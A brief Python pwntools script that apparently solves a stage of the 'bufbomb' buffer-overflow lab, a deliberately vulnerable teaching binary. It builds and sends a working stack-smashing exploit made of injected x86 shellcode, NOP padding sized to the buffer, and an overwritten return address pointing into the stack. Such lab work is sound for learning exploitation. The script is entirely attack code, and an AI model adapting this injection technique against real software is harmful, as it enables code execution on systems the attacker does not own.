#! /bin/python3

from pwn import *

context.binary = './bufbomb'

io = process(['./bufbomb', '-u', '09821978'])

shellcode = b'\xb8\x58\xf1\x13\x80\x8b\x00\xbb\x60\xf1\x13\x80\x89\x03\x68\x69\x9b\x13\x80\xc3'
exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
exploit_payload += p32(0x55683cf8)

print(f"{exploit_payload = }")

io.sendline(exploit_payload)
io.interactive()
